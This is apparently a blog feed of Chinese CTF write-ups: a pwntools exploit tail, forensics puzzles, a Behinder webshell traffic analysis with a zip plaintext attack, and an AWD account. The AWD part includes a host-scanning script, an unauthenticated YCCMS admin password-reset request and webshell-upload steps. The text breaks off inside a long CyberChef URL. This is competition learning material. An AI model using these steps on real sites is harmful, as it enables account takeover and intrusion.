class="hljs-string">b&#x27;544:MEUCIQDR1sW8U1MtsM5rnFP9rV3_UF2yy5aC1AbtgEbFqhvTGAIgJ2YEU8nSR_OKa2iIpIDrWUOAOkgaC3h8PFjtFUgOrq8=&#x27;</span><br><br>p.sendline(token)<br>sleep(<span class="hljs-number">1</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;your token&#x27;</span>, token[:<span class="hljs-number">64</span>])<br>exp = flat(<br>    <span class="hljs-string">b&#x27;flag&#123;&#x27;</span>,<br>    <span class="hljs-string">b&#x27;\x7f&#x27;</span>*<span class="hljs-number">5</span>,<br>    token[:<span class="hljs-number">64</span>]<br>)<br>p.sendlineafter(<span class="hljs-string">b&quot;your flag&quot;</span>, exp)<br>p.interactive()<br><span class="hljs-comment"># flag&#123;n3V3r-90nN4-91v3-Y0U-UP&#125;</span><br></code></pre></td></tr></table></figure><h3 id="SecretDB"><a href="#SecretDB" class="headerlink" title="SecretDB"></a>SecretDB</h3><p>010打开，几乎都是空数据<br>在有数据的块里面找到了相似的结构010f<br><img src="/mdimg/2024yw/1715066669990-30200f39-5ec9-4e06-8f20-f8dabc6cf386.jpeg"><br>尝试发现010f后的第一个字节是顺序第二个字节是数据，如第一个17 2D表示第17位是-<br>把数据都记录出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">data_lines = [<br>    (<span class="hljs-string">&#x27;17&#x27;</span>, <span class="hljs-string">&#x27;2d&#x27;</span>), (<span class="hljs-string">&#x27;0e&#x27;</span>, <span class="hljs-string">&#x27;39&#x27;</span>), (<span class="hljs-string">&#x27;1b&#x27;</span>, <span class="hljs-string">&#x27;37&#x27;</span>), (<span class="hljs-string">&#x27;10&#x27;</span>, <span class="hljs-string">&#x27;33&#x27;</span>), (<span class="hljs-string">&#x27;0a&#x27;</span>, <span class="hljs-string">&#x27;62&#x27;</span>),<br>    (<span class="hljs-string">&#x27;19&#x27;</span>, <span class="hljs-string">&#x27;32&#x27;</span>), (<span class="hljs-string">&#x27;14&#x27;</span>, <span class="hljs-string">&#x27;62&#x27;</span>), (<span class="hljs-string">&#x27;0f&#x27;</span>, <span class="hljs-string">&#x27;32&#x27;</span>), (<span class="hljs-string">&#x27;12&#x27;</span>, <span class="hljs-string">&#x27;2d&#x27;</span>), (<span class="hljs-string">&#x27;23&#x27;</span>, <span class="hljs-string">&#x27;34&#x27;</span>),<br>    (<span class="hljs-string">&#x27;16&#x27;</span>, <span class="hljs-string">&#x27;36&#x27;</span>), (<span class="hljs-string">&#x27;1f&#x27;</span>, <span class="hljs-string">&#x27;61&#x27;</span>), (<span class="hljs-string">&#x27;25&#x27;</span>, <span class="hljs-string">&#x27;38&#x27;</span>), (<span class="hljs-string">&#x27;02&#x27;</span>, <span class="hljs-string">&#x27;61&#x27;</span>), (<span class="hljs-string">&#x27;1e&#x27;</span>, <span class="hljs-string">&#x27;66&#x27;</span>),<br>    (<span class="hljs-string">&#x27;05&#x27;</span>, <span class="hljs-string">&#x27;66&#x27;</span>), (<span class="hljs-string">&#x27;03&#x27;</span>, <span class="hljs-string">&#x27;67&#x27;</span>), (<span class="hljs-string">&#x27;11&#x27;</span>, <span class="hljs-string">&#x27;63&#x27;</span>), (<span class="hljs-string">&#x27;0c&#x27;</span>, <span class="hljs-string">&#x27;30&#x27;</span>), (<span class="hljs-string">&#x27;04&#x27;</span>, <span class="hljs-string">&#x27;7b&#x27;</span>),<br>    (<span class="hljs-string">&#x27;22&#x27;</span>, <span class="hljs-string">&#x27;61&#x27;</span>), (<span class="hljs-string">&#x27;21&#x27;</span>, <span class="hljs-string">&#x27;62&#x27;</span>), (<span class="hljs-string">&#x27;07&#x27;</span>, <span class="hljs-string">&#x27;32&#x27;</span>), (<span class="hljs-string">&#x27;1d&#x27;</span>, <span class="hljs-string">&#x27;66&#x27;</span>), (<span class="hljs-string">&#x27;26&#x27;</span>, <span class="hljs-string">&#x27;66&#x27;</span>),<br>    (<span class="hljs-string">&#x27;1c&#x27;</span>, <span class="hljs-string">&#x27;2d&#x27;</span>), (<span class="hljs-string">&#x27;09&#x27;</span>, <span class="hljs-string">&#x27;31&#x27;</span>), (<span class="hljs-string">&#x27;27&#x27;</span>, <span class="hljs-string">&#x27;30&#x27;</span>), (<span class="hljs-string">&#x27;0d&#x27;</span>, <span class="hljs-string">&#x27;2d&#x27;</span>), (<span class="hljs-string">&#x27;0b&#x27;</span>, <span class="hljs-string">&#x27;66&#x27;</span>),<br>    (<span class="hljs-string">&#x27;08&#x27;</span>, <span class="hljs-string">&#x27;39&#x27;</span>), (<span class="hljs-string">&#x27;13&#x27;</span>, <span class="hljs-string">&#x27;34&#x27;</span>), (<span class="hljs-string">&#x27;29&#x27;</span>, <span class="hljs-string">&#x27;7d&#x27;</span>), (<span class="hljs-string">&#x27;15&#x27;</span>, <span class="hljs-string">&#x27;61&#x27;</span>), (<span class="hljs-string">&#x27;28&#x27;</span>, <span class="hljs-string">&#x27;62&#x27;</span>),<br>    (<span class="hljs-string">&#x27;06&#x27;</span>, <span class="hljs-string">&#x27;36&#x27;</span>), (<span class="hljs-string">&#x27;1a&#x27;</span>, <span class="hljs-string">&#x27;64&#x27;</span>), (<span class="hljs-string">&#x27;24&#x27;</span>, <span class="hljs-string">&#x27;65&#x27;</span>), (<span class="hljs-string">&#x27;20&#x27;</span>, <span class="hljs-string">&#x27;62&#x27;</span>)<br>]<br><br>result_string = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> index_hex, char_hex <span class="hljs-keyword">in</span> data_lines:<br>    index = <span class="hljs-built_in">int</span>(index_hex, <span class="hljs-number">16</span>)<br>    char_code = <span class="hljs-built_in">int</span>(char_hex, <span class="hljs-number">16</span>)<br>    <br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(result_string) &lt;= index:<br>        result_string += <span class="hljs-string">&#x27; &#x27;</span><br>    <br>    result_string = result_string[:index] + <span class="hljs-built_in">chr</span>(char_code) + result_string[index+<span class="hljs-number">1</span>:]<br><br><span class="hljs-built_in">print</span>(result_string)<br><span class="hljs-comment">#  ag&#123;f6291bf0-923c-4ba6- 2d7-ffabba4e8f0b&#125;</span><br></code></pre></td></tr></table></figure><p>发现第三个-后面2d前面缺了一位，补上8 flag正确<br><code>flag&#123;f6291bf0-923c-4ba6-82d7-ffabba4e8f0b&#125;</code></p><h3 id="easyshell"><a href="#easyshell" class="headerlink" title="easyshell"></a>easyshell</h3><p>冰蝎流量</p><p><img src="/mdimg/2024yw/download.png"></p><p>在1278流中得到压缩包</p><p>aes解密再解base64解密两次，保存压缩包</p><p><img src="/mdimg/2024yw/download1.png"></p><p>得到</p><p><img src="/mdimg/2024yw/download2.png"></p><p>在这个1982流得到信息</p><p><img src="/mdimg/2024yw/download3.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Hello, but what yo<span class="hljs-string">u&#x27;re looking for isn&#x27;</span>t me.<br></code></pre></td></tr></table></figure><p>使用下面的方法压缩上面字符保存的txt</p><p><img src="/mdimg/2024yw/download4.png"></p><p>crc相同，明文攻击</p><p><img src="/mdimg/2024yw/download5.png"></p><p><img src="/mdimg/2024yw/download0.png"></p><p>得到压缩包密码<code>A8s123/+*</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">70854278</span>-ea0c-<span class="hljs-number">462</span>e-bc18-<span class="hljs-number">468</span>c7a04a505&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次bugku S2 AWD排位赛-21 web</title>
    <link href="/2024/05/02/%E8%AE%B0%E4%B8%80%E6%AC%A1bugku%20S2%20AWD%E6%8E%92%E4%BD%8D%E8%B5%9B-21%20web/"/>
    <url>/2024/05/02/%E8%AE%B0%E4%B8%80%E6%AC%A1bugku%20S2%20AWD%E6%8E%92%E4%BD%8D%E8%B5%9B-21%20web/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/bugkuawd/1714656691023-35fa43b0-9ce9-4294-b318-f154cb31865d.png"><br>先扫ip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><span class="hljs-keyword">import</span> re<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;host.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_ip</span>(<span class="hljs-params">url</span>):<br>    resp = requests.get(url)<br>    status = resp.status_code<br>    <span class="hljs-keyword">if</span> status == <span class="hljs-number">200</span>:<br>        f.write(url + <span class="hljs-string">&quot;\n&quot;</span>)<br>        <span class="hljs-built_in">print</span>(url)<br><br>url = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">255</span>):<br>    url.append(<span class="hljs-string">&quot;http://192-168-1-&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;.pvp4274.bugku.cn&quot;</span>)<br><span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">100</span>) <span class="hljs-keyword">as</span> executor:<br>    executor.<span class="hljs-built_in">map</span>(get_ip, url)<br></code></pre></td></tr></table></figure><p>得到别的选手的ip地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">http://<span class="hljs-number">192</span>-<span class="hljs-number">168</span>-<span class="hljs-number">1</span>-<span class="hljs-number">4.</span>pvp4274.bugku.cn<br>http://<span class="hljs-number">192</span>-<span class="hljs-number">168</span>-<span class="hljs-number">1</span>-<span class="hljs-number">17.</span>pvp4274.bugku.cn<br>http://<span class="hljs-number">192</span>-<span class="hljs-number">168</span>-<span class="hljs-number">1</span>-<span class="hljs-number">87.</span>pvp4274.bugku.cn<br>http://<span class="hljs-number">192</span>-<span class="hljs-number">168</span>-<span class="hljs-number">1</span>-<span class="hljs-number">103.</span>pvp4274.bugku.cn<br>http://<span class="hljs-number">192</span>-<span class="hljs-number">168</span>-<span class="hljs-number">1</span>-<span class="hljs-number">164.</span>pvp4274.bugku.cn<br>http://<span class="hljs-number">192</span>-<span class="hljs-number">168</span>-<span class="hljs-number">1</span>-<span class="hljs-number">47.</span>pvp4274.bugku.cn<br>http://<span class="hljs-number">192</span>-<span class="hljs-number">168</span>-<span class="hljs-number">1</span>-<span class="hljs-number">48.</span>pvp4274.bugku.cn<br>http://<span class="hljs-number">192</span>-<span class="hljs-number">168</span>-<span class="hljs-number">1</span>-<span class="hljs-number">216.</span>pvp4274.bugku.cn<br>http://<span class="hljs-number">192</span>-<span class="hljs-number">168</span>-<span class="hljs-number">1</span>-<span class="hljs-number">235.</span>pvp4274.bugku.cn<br></code></pre></td></tr></table></figure><p>然后把网站目录dump下来d盾开扫<br><img src="/mdimg/bugkuawd/1714656739511-4c297ea8-7a51-4bb9-896f-4c9bfd101669.png"><br>可以结合seay开扫<br><img src="/mdimg/bugkuawd/1714656751254-6a694285-cdaf-4c7b-be76-fa8be67606cf.png"><br>然后前期如果只能拿到ssh修复不能访问web服务的话，可以根据dump下来的源码phpstudy本地搭一个网站<br>然后可以直观的根据上面的d盾和seay结果 去信息收集，或者验证漏洞<br>一个awd应该都不止一个漏洞的，如果一下子就找到漏洞并利用成功然后修好了，修复阶段还有时间的话可以看看别的漏洞（记得某个神说过：awd最重要的是让别人拿不到分<br>如果漏洞利用成功的话，可以在ssh修自己靶机的这个洞了，怎么修的话如果能和我下面做这个一样能找到这么细的代码审计来复现的文章的话，根据文章对症下药就行了，不过一般能够打得穿应该知道大概怎么修了（<br>然后后面攻击阶段可以直接打别人没修这个洞的ip了<br>比如这里我本地搭了这个站，根据上面d盾标红的2022.php，访问<br><img src="/mdimg/bugkuawd/1714656764602-6d95293d-a2e5-40b7-b392-13cd0bf14ec9.png"><br>做过bugku可能会认得，没的话搜一下菊花聊天室也能找到 好像是bugku的留言板题目xss<br><a href="https://blog.csdn.net/qq_56313338/article/details/125929462">https://blog.csdn.net/qq_56313338/article/details/125929462</a><br>就可以根据此去复现一下<br>如果在上面的过程中还是没找到什么可以比较容易复现的漏洞的话<br>可以常规打法做一下<br>dirsearch扫<br><img src="/mdimg/bugkuawd/1714656782593-da18c3df-233a-4173-9724-34fa9257752b.png"><br>前段时间学习挖了一下弱密码的洞，对/admin/这个路由很敏感，是很多cms后台登录的路由<br><img src="/mdimg/bugkuawd/1714656790700-6366b16c-fa83-42cf-b958-6bb116cf44a4.png"><br>这里直接能看到是什么cms了，如果这里不容易看出是什么cms的话可以找些网站或者工具<br>如：<a href="https://whatcms.org/">https://whatcms.org/</a><br>找yccms漏洞<br><a href="https://blog.csdn.net/cosmoslin/article/details/123178882">https://blog.csdn.net/cosmoslin/article/details/123178882</a><br>直接复现就行了<br>改密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">POST /admin/?a=admin&amp;m=update HTTP/<span class="hljs-number">1.1</span><br>username=admin&amp;password=<span class="hljs-number">123456</span>&amp;notpassword=<span class="hljs-number">123456</span>&amp;send=%E4%BF%AE%E6%<span class="hljs-number">94</span>%B9%E5%AF%<span class="hljs-number">86</span>%E7%A0%<span class="hljs-number">81</span><br><br></code></pre></td></tr></table></figure><p>然后admin 123456登录后台<br><img src="/mdimg/bugkuawd/1714656817825-9895cf53-4c9c-42e4-9b0c-b243129fe38e.png"><br>传🐎<br><img src="/mdimg/bugkuawd/1714656830042-a4e1e79c-8cff-409c-bf74-9380f5ac32d5.png"><br>访问<code>/view/index/images/logo.php</code><br><img src="/mdimg/bugkuawd/1714656849916-cd3a9792-bbb5-47e2-8a38-33082ffbd972.png"><br>到这，如果代码能力比较屌的话就可以写脚本挂着批量打，然后就能刷抖音了</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024数据安全产业人才积分争夺赛初赛wp</title>
    <link href="/2024/04/29/2024%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
    <url>/2024/04/29/2024%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h2 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p><img src="/mdimg/2024%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1714476558068-336bec9c-c3ed-44e8-abaa-a7705de4014f.jpeg" alt="1714476509596.jpg"></p><h3 id="Strangesystem（复现）"><a href="#Strangesystem（复现）" class="headerlink" title="Strangesystem（复现）"></a>Strangesystem（复现）</h3><p>题目内容：你是一名安全防护人员，你发现有人成功入侵了公司的服务器，你查找有关的流量设备，发现了一个流量包文件，你认为它可能包含了一些重要的信息。但是当你打开它时，你发现它被加密了：你觉得这个文件可能被某种奇怪的系统加密过，你想要找出加密算法并解密出文件内容。<br>http就两条<br><img src="/mdimg/2024%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1714477796213-58985249-933d-4668-a883-5e6bdb8bd689.png" alt="image.png"><br>有个png，dump下来</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//ctf.mzy<span class="hljs-number">0</span>.com/CyberChef<span class="hljs-number">3</span>/#recipe<span class="hljs-operator">=</span>From_Hexdump<span class="hljs-variable">%EF</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%88</span><span class="hljs-variable">%E6</span><span class="hljs-variable">%9</span>D<span class="hljs-variable">%A5</span><span class="hljs-variable">%E8</span><span class="hljs-variable">%87</span><span class="hljs-variable">%AA16</span><span class="hljs-variable">%E8</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%9</span>B<span class="hljs-variable">%E5</span><span class="hljs-variable">%88</span><span class="hljs-variable">%B6</span><span class="hljs-variable">%E8</span><span class="hljs-variable">%BD</span><span class="hljs-variable">%AC</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%AD</span><span class="hljs-variable">%98</span><span class="hljs-variable">%EF</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%89</span>()&amp;input<span class="hljs-operator">=</span>CiAgICAwMDAwMDBCQiAgODkgNTAgNGUgNDcgMGQgMGEgMWEgMGEgIDAwIDAwIDAwIDBkIDQ<span class="hljs-number">5</span>IDQ<span class="hljs-number">4</span>IDQ<span class="hljs-number">0</span>IDUyICAgLlBORy<span class="hljs-number">4</span>uLi<span class="hljs-number">4</span>gLi<span class="hljs-number">4</span>uLklIRFIKICAgIDAwMDAwMENCICAwMCAwMCAwMCA<span class="hljs-number">4</span>MiAwMCAwMCAwMCA<span class="hljs-number">4</span>MiAgMDggMDMgMDAgMDAgMDAgYmQgZGQgZTAgICAuLi<span class="hljs-number">4</span>uLi<span class="hljs-number">4</span>uLiAuLi<span class="hljs-number">4</span>uLi<span class="hljs-number">4</span>uLgogICAgMDAwMDAwREIgIGNmIDAwIDAwIDAwIDkzIDUwIDRjIDU<span class="hljs-number">0</span>ICA<span class="hljs-number">0</span>NSBmZiBmZiBmZiAyNiA<span class="hljs-number">0</span>NiA<span class="hljs-number">1</span>YiAzOCAgIC<span class="hljs-number">4</span>uLi<span class="hljs-number">4</span>uUExUIEUuLi<span class="hljs-number">4</span>mRls<span class="hljs-number">4</span>CiAgICAwMDAwMDBFQiAgYzIgZTQgMjMgNDQgNWEgZmIgZmMgZmMgIGQ<span class="hljs-number">2</span>IGRhIGRkIDAwIDJkIDQ<span class="hljs-number">4</span>IGY<span class="hljs-number">2</span>IGY<span class="hljs-number">3</span>ICAgLi<span class="hljs-number">4</span>jRFouLi<span class="hljs-number">4</span>gLi<span class="hljs-number">4</span>uLi<span class="hljs-number">1</span>ILi<span class="hljs-number">4</span>KICAgIDAwMDAwMEZCICBmOCAxYyA<span class="hljs-number">0</span>MCA<span class="hljs-number">1</span>NiBjZiBkNCBkOCAyMCAgNDMgNTggMDAgMWQgM<span class="hljs-number">2</span>UgZGQgZTAgZTMgICAuLkBWLi<span class="hljs-number">4</span>uICBDWC<span class="hljs-number">4</span>uPi<span class="hljs-number">4</span>uLgogICAgMDAwMDAxMEIgIDZlIDdlIDhhIDAwIDMxIDRiIGU<span class="hljs-number">3</span>IGVhICBlYiBjOCBjZCBkMSA<span class="hljs-number">1</span>NSA<span class="hljs-number">2</span>OCA<span class="hljs-number">3</span>NyAwMyAgIG<span class="hljs-number">5</span><span class="hljs-variable">%2</span>BLi<span class="hljs-number">4</span>xSy<span class="hljs-number">4</span>uIC<span class="hljs-number">4</span>uLi<span class="hljs-number">5</span>VaHcuCiAgICAwMDAwMDExQiAgMzYgNGUgYTUgYWUgYjUgMzAgNGEgNWUgIDI<span class="hljs-number">1</span>IDNmIDU<span class="hljs-number">0</span>IDdhIDg<span class="hljs-number">2</span>IDkxIDE<span class="hljs-number">0</span>IDNjICAgNk<span class="hljs-number">4</span>uLi<span class="hljs-number">4</span>wSl<span class="hljs-number">4</span>gJT<span class="hljs-number">9</span>Uei<span class="hljs-number">4</span>uLjwKICAgIDAwMDAwMTJCICA<span class="hljs-number">1</span>MyA<span class="hljs-number">5</span>NiBhMSBhYSA<span class="hljs-number">0</span>ZSA<span class="hljs-number">2</span>MyA<span class="hljs-number">3</span>MyBiNiAgYmUgYzMgMzggY<span class="hljs-number">2</span>EgZWQgNWEgNmQgN<span class="hljs-number">2</span>MgICBTLi<span class="hljs-number">4</span>uTmNzLiAuLjguLlptfAogICAgMDAwMDAxM<span class="hljs-number">0</span>IgIDkwIDliIGE<span class="hljs-number">0</span>IDJkIDVhIDcwIDI<span class="hljs-number">2</span>IDM<span class="hljs-number">0</span>ICA<span class="hljs-number">0</span>OCAzMiA<span class="hljs-number">2</span>YSA<span class="hljs-number">4</span>MSAzMiA<span class="hljs-number">3</span>NyA<span class="hljs-number">5</span>MCAzYiAgIC<span class="hljs-number">4</span>uLi<span class="hljs-number">1</span>acCY<span class="hljs-number">0</span>IEgyai<span class="hljs-number">4</span>ydy<span class="hljs-number">47</span>CiAgICAwMDAwMDE<span class="hljs-number">0</span>QiAgOWQgYjkgMmEgNTIgNjggMDAgMjcgNDQgIDNhIDU<span class="hljs-number">1</span>IDY<span class="hljs-number">3</span>IDNjIGE<span class="hljs-number">5</span>IGM<span class="hljs-number">3</span>IDgxIDhmICAgLi<span class="hljs-number">4</span>qUmguJ<span class="hljs-number">0</span>QgOlVnPC<span class="hljs-number">4</span>uLi<span class="hljs-number">4</span>KICAgIDAwMDAwMTVCICA<span class="hljs-number">5</span>OSAzNiA<span class="hljs-number">4</span>MCA<span class="hljs-number">5</span>OSAwMCAyMiA<span class="hljs-number">0</span>MSA<span class="hljs-number">2</span>MSAgNzQgODEgM<span class="hljs-number">2</span>MgYjggZDggYWUgYjYgYmQgICAuNi<span class="hljs-number">4</span>uLiJBYSB<span class="hljs-number">0</span>LjwuLi<span class="hljs-number">4</span>uLgogICAgMDAwMDAxNkIgIDNiIDkxIGFhIDE<span class="hljs-number">3</span>IDM<span class="hljs-number">2</span>IDRkIDMzIDcxICA<span class="hljs-number">4</span>NyAwMCAxNSAzNSAxMyA<span class="hljs-number">0</span>MCBjZCA<span class="hljs-number">3</span>YyAgIDsuLi<span class="hljs-number">42</span>TTNxIC<span class="hljs-number">4</span>uLjUuQC<span class="hljs-number">58</span>CiAgICAwMDAwMDE<span class="hljs-number">3</span>QiAgMDAgMDAgMDMgZDkgNDkgNDQgNDEgNTQgIDc<span class="hljs-number">4</span>IDljIGVkIDk<span class="hljs-number">4</span>IDBkIDczIGFhIDM<span class="hljs-number">4</span>ICAgLi<span class="hljs-number">4</span>uLklEQVQgeC<span class="hljs-number">4</span>uLi<span class="hljs-number">5</span>zLjgKICAgIDAwMDAwMThCICAxNCA<span class="hljs-number">4</span>NiAwOSBjMSAxMCA<span class="hljs-number">1</span>MSAwMSAwMyAgMjEgYTIgNjAgYWQgOGEgNWEgYjQgYjUgICAuLi<span class="hljs-number">4</span>uLlEuLiAhLmAuLlouLgogICAgMDAwMDAxOUIgIGZmIGZmIGQ<span class="hljs-number">3</span>IGVkIDA<span class="hljs-number">5</span>IDFmIDAxIGRhICBkZSBkZSBiOSBiYiA<span class="hljs-number">1</span>YiA<span class="hljs-number">5</span>YyBkOSAzZCAgIC<span class="hljs-number">4</span>uLi<span class="hljs-number">4</span>uLi<span class="hljs-number">4</span>uIC<span class="hljs-number">4</span>uLi<span class="hljs-number">5</span>bLi<span class="hljs-number">49</span>CiAgICAwMDAwMDFBQiAgY<span class="hljs-number">2</span>YgOGMgMzMgODUgOTAgZjAgZjYgZTQgIDdjIDA<span class="hljs-number">1</span>IGNiIDQyIDEwIDA<span class="hljs-number">0</span>IDQxIDEwICAgLi<span class="hljs-number">4</span>zLi<span class="hljs-number">4</span>uLi<span class="hljs-number">4</span>gfC<span class="hljs-number">4</span>uQi<span class="hljs-number">4</span>uQS<span class="hljs-number">4</span>KICAgIDAwMDAwMUJCICAwNCA<span class="hljs-number">0</span>MSAxMCAwNCA<span class="hljs-number">0</span>MSAxMCAwNCA<span class="hljs-number">0</span>MSAgMTAgMDQgNDEgOTAgZmYgMWIgNDEgZjAgICAuQS<span class="hljs-number">4</span>uQS<span class="hljs-number">4</span>uQSAuLkEuLi<span class="hljs-number">5</span>BLgogICAgMDAwMDAxQ<span class="hljs-number">0</span>IgIDYwIDAxIDYxIDE<span class="hljs-number">2</span>IGM<span class="hljs-number">3</span>IGM<span class="hljs-number">5</span>IGZjIDgxICAwMiA<span class="hljs-number">4</span>MiA<span class="hljs-number">4</span>NSBjZiAyOSA<span class="hljs-number">1</span>NSBmZSBjYSAgIGAuYS<span class="hljs-number">4</span>uLi<span class="hljs-number">4</span>uIC<span class="hljs-number">4</span>uLi<span class="hljs-number">4</span>pVS<span class="hljs-number">4</span>uCiAgICAwMDAwMDFEQiAgNzkgOTAgMDAgMzcgNjcgOWMgNTQgMDggIDcyIDdiIDg<span class="hljs-number">4</span>IDgyIDViIGFjIDQ<span class="hljs-number">4</span>IDBiICAgeS<span class="hljs-number">4</span>uN<span class="hljs-number">2</span>cuVC<span class="hljs-number">4</span>gcnsuLlsuSC<span class="hljs-number">4</span>KICAgIDAwMDAwMUVCICAxNSBlOSA<span class="hljs-number">2</span>NCA<span class="hljs-number">3</span>NCAwMSA<span class="hljs-number">5</span>MyBhNSA<span class="hljs-number">0</span>ZiAgNDkgMGYgYWUgY<span class="hljs-number">2</span>UgZTMgZmEgYTUgOWIgICAuLmR<span class="hljs-number">0</span>Li<span class="hljs-number">4</span>uTyBJLi<span class="hljs-number">4</span>uLi<span class="hljs-number">4</span>uLgogICAgMDAwMDAxRkIgIGY<span class="hljs-number">4</span>IDljIDBjIGExIDRhIDQ<span class="hljs-number">1</span>IDIzIDBhICA<span class="hljs-number">1</span>OCBjZCBjYyAxZSA<span class="hljs-number">0</span>OCAyOSA<span class="hljs-number">4</span>ZCAzNSAgIC<span class="hljs-number">4</span>uLi<span class="hljs-number">5</span>KRSMuIFguLi<span class="hljs-number">5</span>IKS<span class="hljs-number">41</span>CiAgICAwMDAwMDIwQiAgMDQgNWYgOGYgYTQgMjAgMDQgZjcgMzMgIDAyIGVlIGQ<span class="hljs-number">3</span>IGQzIDU<span class="hljs-number">2</span>IGI<span class="hljs-number">2</span>IDk<span class="hljs-number">3</span>IDllICAgLl<span class="hljs-number">8</span>uLiAuLjMgLi<span class="hljs-number">4</span>uLlYuLi<span class="hljs-number">4</span>KICAgIDAwMDAwMjFCICBjYSBjNiAwOSA<span class="hljs-number">1</span>MCAzNyAyMiBiNSAxMSAgYTggZGMgOWUgMzYgYjYgNmQgZWYgYTkgICAuLi<span class="hljs-number">5</span>QNyIuLiAuLi<span class="hljs-number">42</span>Lm<span class="hljs-number">0</span>uLgogICAgMDAwMDAyMkIgIGIxIDg<span class="hljs-number">0</span>IDUyIGI<span class="hljs-number">5</span>IGZiIGQzIGVmIGNmICA<span class="hljs-number">5</span>NyBjOSBkNCA<span class="hljs-number">3</span>MiBjZiBjYyAwMyAxMyAgIC<span class="hljs-number">4</span>uUi<span class="hljs-number">4</span>uLi<span class="hljs-number">4</span>uIC<span class="hljs-number">4</span>uLnIuLi<span class="hljs-number">4</span>uCiAgICAwMDAwMDIzQiAgYzQgN<span class="hljs-number">2</span>IgMmQgYzAgYjYgMzcgZjYgZTUgIDQ<span class="hljs-number">5</span>IDc<span class="hljs-number">2</span>IGJiIGYxIGQzIDAxIGVhIDllICAgLnstLi<span class="hljs-number">43</span>Li<span class="hljs-number">4</span>gSXYuLi<span class="hljs-number">4</span>uLi<span class="hljs-number">4</span>KICAgIDAwMDAwMjRCICA<span class="hljs-number">1</span>ZiA<span class="hljs-number">4</span>ZSBlNSBkYyA<span class="hljs-number">5</span>YSAxNyA<span class="hljs-number">1</span>MiA<span class="hljs-number">1</span>ZSAgNmMgYzMgZTYgN<span 